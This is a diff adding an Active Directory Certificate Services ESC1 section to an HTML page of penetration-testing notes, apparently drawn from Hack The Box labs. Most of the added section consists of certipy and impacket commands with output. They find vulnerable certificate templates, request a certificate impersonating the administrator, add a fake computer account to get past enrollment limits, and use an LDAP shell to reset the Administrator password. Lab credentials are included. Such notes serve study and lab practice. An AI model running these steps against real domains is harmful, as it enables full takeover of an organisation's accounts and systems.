@@ -24,6 +24,38 @@
         </div>
         <div class="notion-body">
             <ul>
+                <b>Check out all the different privilege esclation techniques <a class="notion-link" href="https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation">Here</a></b>
+                <p>Begin identifying vulnerable certificates</p>
+                <pre><code class="language-bash"></code>certipy find -u 'ca_svc@sequel.htb' -p 'WqSZAF6CysDQbGb3' -dc-ip '10.10.11.51' -vulnerable -stdout</pre>
+
+                <h2>Active Directory Certificate Services (ADCS) | Enrollee-Supplied Subject for Client Authentication - ESC1  </h2>
+                <ul>
+                    <p>It occurs when a certificate template is misconfigured in a way that allows any low-privileged user to request a certificate and impersonate any domain identity, including administrators.</p>
+                    <p>As you can see in the following command we are requesting the certificate as we were an administrator.</p>
+                    <pre><code class="language-bash"></code>certipy req -u 'svc_ldap@authority.htb' -p 'Passw0rd!' -dc-ip '10.129.229.56' -target 'authority.authority.htb' -ca 'CA-NAME' -template 'VulnTemplate' -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'</pre>
+                    <p>This will generate the file administrator.pfx which now we can use in order to obtain the NTLM password of the Administrator account</p>
+                    <pre><code class="language-bash">certipy auth -pfx administrator_administrator.pfx -domain sequel.htb</code></pre>
+                    <h3>Errors</h3>
+                    <ul>
+                        <p>In case it fails since your user does not has permissions in order to request that certificate (look at certipy output first command) we can attempt to trick it.</p>
+                        <p>In that specific case only domain computers were able to request it so i added a computer to the domain with the following command</p>
+                        <pre><code class="language-bash">impacket-addcomputer 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!' -dc-ip 10.129.229.56 -computer-name 'FAKEMACHINE$' -computer-pass 'Password123!'</code></pre>
+                        <p>And then requested the certificate again with that computer</p>
+                        <pre><code class="language-bash">certipy-ad req -u 'FAKEMACHINE$@authority.htb' -p 'Password123!' -dc-ip '10.129.229.56' -target 'authority.authority.htb' -ca 'AUTHORITY-CA' -template 'CorpVPN' -upn 'administrator@authority.htb'</code></pre>
+                        <p>Now we have the administrator.pfx but when attempting to use it to retrieve the NTLM password of the admin it says the following</p>
+                        <pre><code class="language-bash">[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)</code></pre>
+                        <p>This is because the DC does not support PKINIT (Kerberos Authentication with certificate). In that case we could use LDAP shell in order to create an admin users to change the admin password. To do so just use the <b>-ldap-shell</b> parameter</p>
+                        <pre><code class="language-bash">certipy-ad auth -ldap-shell -pfx administrator.pfx -domain authority.htb -dc-ip 10.129.229.56 </code></pre>
+                        <p>Now perform any action. Example of changing password</p>
+                        <pre><code class="language-bash"># change_password Administrator mypassword123!
+Got User DN: CN=Administrator,CN=Users,DC=authority,DC=htb
+Attempting to set new password of: mypassword123!
+Password changed successfully!</code></pre>
+                        
+                    </ul>
+
+                </ul>
+                
                 <h2>Active Directory Certificate Services (ADCS) | Template Haijacking - ESC4  </h2>
                 <ul>
                     <p>Having in mind that there is a vulnerable certificate template wich has wrong configuration can be used to request certificates impersonating another user</p>
